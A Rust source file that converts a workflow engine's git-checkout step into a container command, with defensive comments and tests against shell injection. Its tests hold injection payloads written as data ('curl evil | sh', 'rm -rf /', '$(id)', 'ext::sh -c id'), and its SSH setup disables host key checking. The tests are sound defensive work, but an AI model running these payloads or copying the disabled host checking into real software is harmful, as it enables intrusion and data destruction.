use anyhow::Context;
use serde_json::Value;
use sqlx::PgPool;
use stormchaser_model::dsl;

/// Mutates the git_checkout step spec to automatically configure parameters like repository, reference, and token based on context if they are omitted.
pub async fn mutate(
    step_type: &mut String,
    resolved_spec: &mut Value,
    pool: Option<&PgPool>,
    run_id: Option<stormchaser_model::RunId>,
) -> anyhow::Result<()> {
    if step_type == "GitCheckout" {
        let git_spec: Result<dsl::GitCheckoutSpec, _> =
            serde_json::from_value(resolved_spec.get("spec").unwrap_or(&*resolved_spec).clone());

        if let Ok(git) = git_spec {
            let container_spec = build_git_container_spec(&git, pool, run_id).await?;
            *step_type = "RunContainer".to_string();
            if let Ok(val) = serde_json::to_value(container_spec) {
                *resolved_spec = val;
            }
        }
    }
    Ok(())
}

/// Checks out `$STORMCHASER_GIT_REF` of `$STORMCHASER_GIT_REPO` into
/// `$STORMCHASER_GIT_DEST`, limited to the paths given as arguments if there are any.
/// Every value is quoted, and `--` ends git's options before each one, so a ref such as
/// `--upload-pack=...` is a (bad) ref rather than an option.
const CHECKOUT_SCRIPT: &str = r#"mkdir -p -- "$STORMCHASER_GIT_DEST" && cd -- "$STORMCHASER_GIT_DEST" && git init && git remote add -- origin "$STORMCHASER_GIT_REPO" && { [ "$#" -eq 0 ] || git sparse-checkout set -- "$@"; } && git fetch --depth "$STORMCHASER_GIT_DEPTH" --filter=blob:none -- origin "$STORMCHASER_GIT_REF" && git checkout FETCH_HEAD"#;

async fn build_git_container_spec(
    git: &dsl::GitCheckoutSpec,
    pool: Option<&PgPool>,
    run_id: Option<stormchaser_model::RunId>,
) -> anyhow::Result<dsl::CommonContainerSpec> {
    let depth = git.depth.unwrap_or(1);
    let dest = git.destination.clone().unwrap_or_else(|| ".".to_string());
    let branch = git.r#ref.clone().unwrap_or_else(|| "main".to_string());

    let mut auth_command = String::new();
    let mut env_vars = Vec::new();

    if let Some(conn_name) = &git.connection {
        let pool = pool.with_context(|| {
            format!(
                "GitCheckout step references connection '{}' but no database context is available",
                conn_name
            )
        })?;
        let conn = crate::db::connections::get_storage_backend_by_name::<
            _,
            stormchaser_model::Connection,
        >(pool, conn_name)
        .await?
        .with_context(|| format!("GitCheckout connection '{}' was not found", conn_name))?;
        if let Some(run_id) = run_id {
            crate::authz::ensure_run_may_use(pool, run_id, &conn).await?;
        }

        if conn.connection_type != stormchaser_model::connections::ConnectionType::Git {
            anyhow::bail!(
                "GitCheckout connection '{}' has type {:?}, expected git",
                conn_name,
                conn.connection_type
            );
        }

        if let Some(creds) = &conn.encrypted_credentials {
            if let Some(username) = conn.config.get("username").and_then(|v| v.as_str()) {
                env_vars.push(dsl::EnvVar {
                    name: "GIT_USERNAME".to_string(),
                    value: username.to_string(),
                });
                env_vars.push(dsl::EnvVar {
                    name: "GIT_PASSWORD".to_string(),
                    value: creds.to_string(),
                });
                auth_command = "git config --global credential.helper '!f() { echo username=$GIT_USERNAME; echo password=$GIT_PASSWORD; }; f' && ".to_string();
            } else {
                env_vars.push(dsl::EnvVar {
                    name: "GIT_BEARER_TOKEN".to_string(),
                    value: creds.to_string(),
                });
                auth_command = "git config --global http.extraHeader \"Authorization: Bearer $GIT_BEARER_TOKEN\" && ".to_string();
            }
        }

        if let Some(ssh_key) = conn.config.get("ssh_key").and_then(|v| v.as_str()) {
            env_vars.push(dsl::EnvVar {
                name: "GIT_SSH_KEY".to_string(),
                value: ssh_key.to_string(),
            });
            auth_command = "mkdir -p ~/.ssh && echo \"$GIT_SSH_KEY\" > ~/.ssh/id_rsa && chmod 600 ~/.ssh/id_rsa && export GIT_SSH_COMMAND='ssh -i ~/.ssh/id_rsa -o StrictHostKeyChecking=no' && ".to_string();
        }
    }

    // The repository, ref, destination and paths reach the script as environment
    // variables and arguments, never as part of its text: they can come from a run's
    // inputs, and the container holds the connection's credentials.
    crate::git_cache::validate_repo_url(&git.repo)?;
    for (name, value) in [
        ("STORMCHASER_GIT_REPO", git.repo.clone()),
        ("STORMCHASER_GIT_REF", branch),
        ("STORMCHASER_GIT_DEST", dest),
        ("STORMCHASER_GIT_DEPTH", depth.to_string()),
        // git refuses any other transport, such as `ext::`, which runs commands
        (
            "GIT_ALLOW_PROTOCOL",
            crate::git_cache::allowed_git_schemes().join(":"),
        ),
    ] {
        env_vars.push(dsl::EnvVar {
            name: name.to_string(),
            value,
        });
    }
    let mut command = vec![
        "sh".to_string(),
        "-c".to_string(),
        format!("{auth_command}{CHECKOUT_SCRIPT}"),
        "sh".to_string(),
    ];
    command.extend(git.sparse_checkout.iter().flatten().cloned());

    Ok(dsl::CommonContainerSpec {
        image: "alpine/git:latest".to_string(),
        registry_connection: None,
        connections: None,
        command: Some(command),
        args: None,
        env: Some(env_vars),
        cpu: None,
        memory: None,
        privileged: None,
        storage_mounts: git.storage_mounts.clone(),
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn env(spec: &Value, name: &str) -> String {
        spec["env"]
            .as_array()
            .unwrap()
            .iter()
            .find(|e| e["name"] == name)
            .unwrap_or_else(|| panic!("{name} is not set"))["value"]
            .as_str()
            .unwrap()
            .to_string()
    }

    #[tokio::test]
    async fn test_mutate_git_checkout_default() {
        let mut step_type = "GitCheckout".to_string();
        let mut spec = serde_json::json!({
            "repo": "https://github.com/example/repo.git"
        });

        mutate(&mut step_type, &mut spec, None, None).await.unwrap();

        assert_eq!(step_type, "RunContainer");
        assert_eq!(spec["image"], "alpine/git:latest");
        let command = spec["command"].as_array().unwrap();
        assert_eq!(command.len(), 4);
        assert_eq!(command[0], "sh");
        assert_eq!(command[1], "-c");
        assert_eq!(command[2], CHECKOUT_SCRIPT);
        assert_eq!(
            env(&spec, "STORMCHASER_GIT_REPO"),
            "https://github.com/example/repo.git"
        );
        assert_eq!(env(&spec, "STORMCHASER_GIT_REF"), "main");
        assert_eq!(env(&spec, "STORMCHASER_GIT_DEST"), ".");
        assert_eq!(env(&spec, "STORMCHASER_GIT_DEPTH"), "1");
        assert_eq!(env(&spec, "GIT_ALLOW_PROTOCOL"), "https:ssh");
    }

    #[tokio::test]
    async fn values_never_become_part_of_the_script() {
        let mut step_type = "GitCheckout".to_string();
        let mut spec = serde_json::json!({
            "repo": "https://github.com/example/repo.git",
            "ref": "v1; curl evil | sh",
            "depth": 5,
            "sparse_checkout": ["src/", "$(id)"],
            "destination": "/workspace/repo && rm -rf /"
        });

        mutate(&mut step_type, &mut spec, None, None).await.unwrap();

        let command = spec["command"].as_array().unwrap();
        assert_eq!(command[2], CHECKOUT_SCRIPT);
        assert_eq!(command[4], "src/");
        assert_eq!(command[5], "$(id)");
        assert_eq!(env(&spec, "STORMCHASER_GIT_REF"), "v1; curl evil | sh");
        assert_eq!(
            env(&spec, "STORMCHASER_GIT_DEST"),
            "/workspace/repo && rm -rf /"
        );
    }

    #[tokio::test]
    async fn local_paths_and_command_transports_are_refused() {
        for repo in [
            "file:///etc",
            "/var/lib/repo",
            "ext::sh -c id",
            "http://example.com/r.git",
        ] {
            let mut step_type = "GitCheckout".to_string();
            let mut spec = serde_json::json!({ "repo": repo });
            assert!(
                mutate(&mut step_type, &mut spec, None, None).await.is_err(),
                "{repo}"
            );
        }
    }
}
